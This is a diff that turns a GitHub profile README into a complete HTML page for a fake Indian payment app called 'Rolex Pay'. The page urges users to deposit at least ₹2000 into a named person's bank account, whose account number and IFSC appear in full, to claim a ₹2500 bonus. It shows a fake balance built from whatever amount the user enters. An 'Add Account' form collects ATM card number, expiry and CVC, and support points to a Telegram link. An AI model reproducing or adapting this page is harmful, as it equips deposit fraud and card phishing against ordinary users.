@@ -1,16 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Rolex Pay - India ka No.1 Payment App</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#f8fafc;font-family:'Inter',sans-serif;padding:14px;max-width:480px;margin:auto;font-size:14px;overflow-y:auto}
+    .container{padding-bottom:100px;position:relative;min-height:100vh}
+    header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;position:sticky;top:0;background:#f8fafc;z-index:10;padding:10px 0}
+    .logo{font-size:28px;font-weight:800;color:#1a5f3d}
+    .logo span{color:#d4af37}
+    .profile-btn{width:44px;height:44px;background:linear-gradient(135deg,#d4af37,#f1c40f);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#1a5f3d;font-weight:800;font-size:16px;cursor:pointer}
+    .balance-card{background:linear-gradient(135deg,#1a5f3d,#2e8b57);color:white;padding:26px;border-radius:24px;margin-bottom:32px;box-shadow:0 8px 22px rgba(26,95,61,.32)}
+    .commission-value{font-size:38px;font-weight:800}
+    .balance-amount{font-size:38px;font-weight:800;text-align:right}
+    .actions{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin-bottom:36px} 
+    .action-btn{background:white;padding:20px 10px;border-radius:22px;text-align:center;box-shadow:0 4px 14px rgba(0,0,0,.08);cursor:pointer;transition:transform .2s}
+    .action-btn:active{transform:scale(0.95)}
+    .action-icon{width:60px;height:60px;margin:0 auto 12px;background:#f0f7f0;border-radius:50%;display:flex;align-items:center;justify-content:center}
+    .action-label{font-size:12.5px;font-weight:600;color:#2d3436;padding: 0 5px;} 
+    .section-title{font-size:19px;font-weight:700;margin-bottom:16px;display:flex;justify-content:space-between;color:#1a1a1a}
+    .add-link{color:#1a5f3d;font-weight:600;font-size:15px;cursor:pointer}
+    .bank-list{margin-top:16px}
+    .bank-item{background:white;padding:16px;border-radius:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(0,0,0,.06);display:flex;justify-content:space-between;align-items:center;cursor:pointer}
+    .bank-name{font-weight:600}
+    .bank-acc{font-size:13px;color:#7f8c8d}
+    .status-inactive{color:#e74c3c;font-size:13px;font-weight:600}
+    .no-accounts{text-align:center;padding:40px 20px;background:#fdfdfd;border:2px dashed #ddd;border-radius:20px;color:#95a5a6;font-size:15px}
+    .live-history-btn{background:linear-gradient(135deg,#1a5f3d,#2e8b57);color:white;text-align:center;padding:20px;border-radius:22px;font-weight:700;font-size:16px;margin:36px 0;cursor:pointer;position:relative}
+    .live-badge{position:absolute;top:10px;right:16px;background:#d4af37;color:#1a5f3d;font-size:10px;padding:3px 8px;border-radius:6px}
+    .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);display:none;align-items:center;justify-content:center;z-index:1000;overflow-y:auto}
+    .modal.active{display:flex}
+    .modal-content{background:white;border-radius:26px;width:90%;max-width:380px;max-height:90vh;overflow-y:auto;padding-bottom:20px}
+    .modal-header{padding:20px 24px 16px;border-bottom:1px solid #eee;display:flex;justify-content:space-between;align-items:center}
+    .modal-title{font-size:20px;font-weight:700}
+    .close-modal{font-size:28px;cursor:pointer}
+    .form-group{margin:12px 24px}
+    .form-group label{display:block;margin-bottom:6px;font-weight:600;color:#1a5f3d;font-size:14px}
+    .form-group input,.form-group select{width:100%;padding:14px;border:1.5px solid #ddd;border-radius:14px;font-size:15px;background:#fafafa}
+    .add-bank-btn{background:linear-gradient(135deg,#1a5f3d,#2e8b57);color:white;border:none;padding:16px;width:88%;margin:20px auto;display:block;font-size:16px;font-weight:700;border-radius:14px;cursor:pointer}
+    .details-box{background:#f8f9fa;padding:24px;border-radius:20px;margin:20px 24px;box-shadow:0 2px 12px rgba(0,0,0,.08);text-align:center}
+    .details-label{font-weight:600;color:#1a5f3d;margin-bottom:8px;font-size:15px}
+    .details-value{font-family:monospace;font-size:18px;background:#e8f5e9;padding:12px 16px;border-radius:12px;margin:8px 0;display:flex;align-items:center;justify-content:space-between}
+    .copy-btn{background:#1a5f3d;color:white;padding:6px 12px;border-radius:8px;font-size:12px;cursor:pointer}
+    .profile-info{background:white;padding:20px;border-radius:20px;margin:16px 0;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+    .profile-row{display:flex;justify-content:space-between;align-items:center;margin:12px 0;padding:8px 0;border-bottom:1px solid #eee}
+    .profile-label{color:#7f8c8d;font-size:14px}
+    .profile-value{font-weight:600}
+    .logout-btn{background:#e74c4c;color:white;border:none;padding:14px;width:88%;margin:20px auto;display:block;font-size:16px;font-weight:700;border-radius:14px;cursor:pointer}
+    .bottom-nav{position:fixed;bottom:0;left:0;right:0;background:white;border-top:1px solid #eee;display:flex;justify-content:space-around;padding:12px 0;z-index:999;box-shadow:0 -2px 10px rgba(0,0,0,.05)}
+    .nav-item{text-align:center;cursor:pointer;color:#7f8c8d;font-size:12px;font-weight:600}
+    .nav-item.active{color:#1a5f3d}
+    .nav-icon{width:28px;height:28px;margin:0 auto 4px;display:flex;align-items:center;justify-content:center}
+    .nav-icon svg{width:22px;height:22px;stroke:currentColor;stroke-width:2.2;fill:none}
+  </style>
+</head>
+<body>
 
+<div class="container">
+  <header>
+    <div class="logo">Rolex <span>Pay</span></div>
+    <div class="profile-btn" onclick="openProfile()">RP</div>
+  </header>
 
-<!--
-**RolexPay2025/rolexpay2025** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+  <div class="balance-card">
+    <div>
+      <div class="commission-value">6%</div>
+      <div style="font-size:14px;opacity:.9">Commission</div>
+    </div>
+    <div>
+      <div class="balance-amount" id="totalBalance">₹0.00</div>
+      <div style="font-size:13px;opacity:.9;text-align:right">Total Balance</div>
+    </div>
+  </div>
 
-Here are some ideas to get you started:
+  <div class="actions">
+    <!-- UPI DEPOSIT HATAYA GAYA -->
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+    <div class="action-btn" onclick="openBankDetails()">
+      <div class="action-icon" style="background:#e8f5e9">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1a5f3d" stroke-width="2.5">
+          <rect x="3" y="4" width="18" height="16" rx="2"/>
+          <line x1="3" y1="10" x2="21" y2="10"/>
+          <circle cx="12" cy="15" r="1"/>
+        </svg>
+      </div>
+      <div class="action-label">Bank Deposit</div>
+    </div>
+
+    <div class="action-btn" onclick="showHistory()">
+      <div class="action-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#e67e22" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+      <div class="action-label">History</div>
+    </div>
+
+    <div class="action-btn" onclick="openWithdraw()">
+      <div class="action-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#c2185b" stroke-width="2.5"><path d="M17 11l-5-5-5 5"/><path d="M17 18l-5-5-5 5"/></svg></div>
+      <div class="action-label">Withdraw</div>
+    </div>
+
+    <div class="action-btn" onclick="openRewards()">
+      <div class="action-icon" style="background:linear-gradient(135deg,#fff3e0,#ffe0b2)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#f39c12" stroke-width="2.5"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+      </div>
+      <div class="action-label" style="font-size: 11.5px; line-height: 1.2;">First Deposit and your ₹2500 Claim</div> 
+    </div>
+  </div>
+
+  <div class="section-title">
+    Bank Accounts
+    <span class="add-link" onclick="openBankForm()">Add Account</span>
+  </div>
+
+  <div id="bankList" class="bank-list"></div>
+  <div id="noBanks" class="no-accounts">No accounts added yet.</div>
+
+  <div class="live-history-btn" onclick="showHistory()">
+    LIVE HISTORY DEPOSIT
+    <div class="live-badge">LIVE</div>
+  </div>
+</div>
+
+<div class="bottom-nav">
+  <div class="nav-item active" onclick="scrollToTop()">
+    <div class="nav-icon">
+      <svg viewBox="0 0 24 24"><path d="M3 12h18M12 3v18"/></svg>
+    </div>
+    <div>Home</div>
+  </div>
+  <div class="nav-item" onclick="openSupport()">
+    <div class="nav-icon">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+    </div>
+    <div>Support</div>
+  </div>
+</div>
+
+<!-- MODALS -->
+<div class="modal" id="bankFormModal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <div class="modal-title">Add Bank Account</div>
+      <div class="close-modal" onclick="closeBankForm()">X</div>
+    </div>
+    <div class="form-group"><label>Bank Name</label><select id="bankName"><option>Select a Bank</option><option>HDFC Bank</option><option>State Bank of India</option><option>ICICI Bank</option><option>Axis Bank</option><option>Kotak Mahindra Bank</option><option>Jio Payments Bank</option><option>Yes Bank</option><option>Indian Overseas Bank</option><option>Airtel Payments Bank</option><option>Unity Small Finance Bank</option></select></div>
+    <div class="form-group"><label>Type</label><select id="accType"><option>Savings Account</option><option>Current Account</option></select></div>
+    <div class="form-group"><label>Account Number</label><input type="text" id="accNumber" placeholder="Enter Account Number" maxlength="18"></div>
+    <div class="form-group"><label>Mobile No.</label><input type="tel" id="mobileNo" placeholder="Registered Mobile Number" maxlength="10"></div>
+    <div class="form-group"><label>Name</label><input type="text" id="accName" placeholder="Account Holder Name"></div>
+    <div class="form-group"><label>Bank UPI</label><input type="text" id="upiId" placeholder="Your UPI ID"></div>
+    <div class="form-group"><label>IFSC</label><input type="text" id="ifscCode" placeholder="IFSC Code"></div>
+    <div class="form-group"><label>ATM No.</label><input type="text" id="atmCard" placeholder="16 Digit Card Number" maxlength="19"></div>
+    <div class="form-group"><label>Expiry Date</label><input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5"></div>
+    <div class="form-group"><label>CVC No.</label><input type="text" id="cvcNo" placeholder="CVC" maxlength="3"></div>
+    <button class="add-bank-btn" onclick="addBank()">Add Account</button>
+  </div>
+</div>
+
+<div class="modal" id="bankDetailsModal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <div class="modal-title">Bank Deposit Details</div>
+      <div class="close-modal" onclick="closeBankDetails()">X</div>
+    </div>
+    <div class="details-box">
+      <div class="details-label">Account Holder Name</div>
+      <div class="details-value">Sonu Singh<button class="copy-btn" onclick="copyText('Sonu Singh')">Copy</button></div>
+      <div class="details-label">Account Number</div>
+      <div class="details-value">10000000310822<button class="copy-btn" onclick="copyText('10000000310822')">Copy</button></div>
+      <div class="details-label">IFSC Code</div>
+      <div class="details-value">JIOP0000001<button class="copy-btn" onclick="copyText('JIOP0000001')">Copy</button></div>
+      <p style="margin-top:20px;color:#7f8c8d;font-size:13px">Use these details to transfer money from your bank app.</p>
+      <button class="add-bank-btn" onclick="confirmDeposit()" style="margin-top:20px;">I Have Deposited</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal" id="withdrawModal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <div class="modal-title">Withdraw to Bank</div>
+      <div class="close-modal" onclick="closeWithdraw()">X</div>
+    </div>
+    <div id="noBankMsg" style="text-align:center;padding:40px 20px;color:#e74c3c;font-size:16px;">No bank account added.<br><br><span style="color:#1a5f3d;cursor:pointer;text-decoration:underline;" onclick="openBankForm()">Add Account Now</span></div>
+    <div id="bankDetailsBox" class="details-box" style="display:none;">
+      <div class="details-label">Account Holder Name</div>
+      <div class="details-value"><span id="wName"></span><button class="copy-btn" onclick="copyText(document.getElementById('wName').textContent)">Copy</button></div>
+      <div class="details-label">Account Number</div>
+      <div class="details-value"><span id="wAcc"></span><button class="copy-btn" onclick="copyText(document.getElementById('wAcc').textContent)">Copy</button></div>
+      <div class="details-label">IFSC Code</div>
+      <div class="details-value"><span id="wIfsc"></span><button class="copy-btn" onclick="copyText(document.getElementById('wIfsc').textContent)">Copy</button></div>
+      <div class="details-label">Bank</div>
+      <div class="details-value"><span id="wBank"></span></div>
+    </div>
+  </div>
+</div>
+
+<div class="modal" id="profileModal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <div class="modal-title">My Profile</div>
+      <div class="close-modal" onclick="closeProfile()">X</div>
+    </div>
+    <div class="profile-info">
+      <div class="profile-row"><div class="profile-label">User ID</div><div class="profile-value" id="userId">RP123456</div></div>
+      <div class="profile-row"><div class="profile-label">Password</div><div class="profile-value" id="userPass">••••••••</div></div>
+      <div class="profile-row"><div class="profile-label">Status</div><div class="profile-value" style="color:#27ae60">Active</div></div>
+    </div>
+    <button class="logout-btn" onclick="logout()">Logout</button>
+  </div>
+</div>
+
+<script>
+  let banks = JSON.parse(localStorage.getItem('rolex_banks')) || [];
+  let history = JSON.parse(localStorage.getItem('rolex_history')) || [];
+  let totalBalance = parseFloat(localStorage.getItem('rolex_balance')) || 0;
+  const userId = localStorage.getItem('rolex_userid') || 'RP' + Math.floor(100000 + Math.random() * 900000);
+  const userPass = localStorage.getItem('rolex_pass') || '12345678';
+
+  if (!localStorage.getItem('rolex_userid')) {
+    localStorage.setItem('rolex_userid', userId);
+    localStorage.setItem('rolex_pass', userPass);
+  }
+
+  function updateBalance() { document.getElementById('totalBalance').textContent = `₹${totalBalance.toFixed(2)}`; }
+  function copyText(text) { navigator.clipboard.writeText(text).then(() => alert(`Copied: ${text}`)); }
+
+  // BANK DEPOSIT CONFIRM
+  function confirmDeposit() {
+    const amt = prompt("Enter Deposited Amount (min ₹2000):", "2000");
+    if (!amt || amt < 2000) return alert("Minimum ₹2000 required!");
+    const utr = prompt("Enter UTR Number (from bank):");
+    if (!utr) return alert("UTR is required!");
+    totalBalance += parseFloat(amt);
+    localStorage.setItem('rolex_balance', totalBalance);
+    const now = new Date();
+    history.unshift({ type: 'bank_deposit', amt, utr, displayTime: now.toLocaleString() });
+    localStorage.setItem('rolex_history', JSON.stringify(history));
+    updateBalance();
+    closeBankDetails();
+    alert("Bank Deposit Confirmed! Balance Updated");
+  }
+
+  function openBankDetails() { document.getElementById('bankDetailsModal').classList.add('active'); }
+  function closeBankDetails() { document.getElementById('bankDetailsModal').classList.remove('active'); }
+  function openBankForm() { document.getElementById('bankFormModal').classList.add('active'); }
+  function closeBankForm() { document.getElementById('bankFormModal').classList.remove('active'); }
+
+  function addBank() {
+    const bankName = document.getElementById('bankName').value;
+    const accType = document.getElementById('accType').value;
+    const accNumber = document.getElementById('accNumber').value.trim();
+    const mobile = document.getElementById('mobileNo').value.trim();
+    const accName = document.getElementById('accName').value.trim();
+    const upi = document.getElementById('upiId').value.trim();
+    const ifsc = document.getElementById('ifscCode').value.trim();
+    const atm = document.getElementById('atmCard').value.trim();
+    const expiry = document.getElementById('expiryDate').value.trim();
+    const cvc = document.getElementById('cvcNo').value.trim();
+
+    if (!bankName || bankName === "Select a Bank" || !accNumber || !accName || !mobile || !upi || !ifsc || !atm || !expiry || !cvc) {
+      return alert("All fields are required!");
+    }
+
+    banks.push({ bankName, accType, accNumber, mobile, accName, upi, ifsc, atm, expiry, cvc, status: "inactive" });
+    localStorage.setItem('rolex_banks', JSON.stringify(banks));
+    showBanks();
+    closeBankForm();
+    alert("Bank Account Added! (Status: Inactive)");
+  }
+
+  function showBanks() {
+    const list = document.getElementById('bankList');
+    const no = document.getElementById('noBanks');
+    if (banks.length === 0) { no.style.display = 'block'; list.innerHTML = ''; return; }
+    no.style.display = 'none'; list.innerHTML = '';
+    banks.forEach((b, i) => {
+      list.innerHTML += `<div class="bank-item" onclick="openWithdraw(${i})"><div><div class="bank-name">${b.bankName}</div><div class="bank-acc">${b.accNumber} • ${b.accType}</div></div><div class="status-inactive">Inactive</div></div>`;
+    });
+  }
+
+  function openWithdraw(index = 0) {
+    const modal = document.getElementById('withdrawModal');
+    const noMsg = document.getElementById('noBankMsg');
+    const detailsBox = document.getElementById('bankDetailsBox');
+    if (banks.length === 0) { noMsg.style.display = 'block'; detailsBox.style.display = 'none'; }
+    else {
+      noMsg.style.display = 'none'; detailsBox.style.display = 'block';
+      const b = banks[index];
+      document.getElementById('wName').textContent = b.accName;
+      document.getElementById('wAcc').textContent = b.accNumber;
+      document.getElementById('wIfsc').textContent = b.ifsc;
+      document.getElementById('wBank').textContent = `${b.bankName} (${b.accType})`;
+    }
+    modal.classList.add('active');
+  }
+
+  function closeWithdraw() { document.getElementById('withdrawModal').classList.remove('active'); }
+
+  function openProfile() {
+    document.getElementById('userId').textContent = userId;
+    document.getElementById('userPass').textContent = '••••••••';
+    document.getElementById('profileModal').classList.add('active');
+  }
+  function closeProfile() { document.getElementById('profileModal').classList.remove('active'); }
+
+  function logout() { 
+    if (confirm("Logout?")) { 
+      localStorage.clear(); 
+      alert("Logged out!"); 
+      location.reload(); 
+    } 
+  }
+
+  function showHistory() {
+    if (history.length === 0) return alert("No History");
+    let msg = "Transaction History:\n\n";
+    history.forEach(h => { 
+      msg += `${h.type === 'bank_deposit' ? 'Bank Deposit' : 'Deposit'}: ₹${h.amt}\n`; 
+      if (h.utr) msg += `UTR: ${h.utr}\n`; 
+      msg += `${h.displayTime}\n\n`; 
+    });
+    alert(msg);
+  }
+
+  function openRewards() { alert("Claim your ₹2500 bonus after first deposit!"); }
+
+  function scrollToTop() { window.scrollTo({top:0, behavior:'smooth'}); }
+
+  function openSupport() { 
+    window.open("https://t.me/+ubP2eLl_Ic4wMTE1", "_blank"); 
+  }
+
+  showBanks(); updateBalance();
+</script>
+
+</body>
+</html>
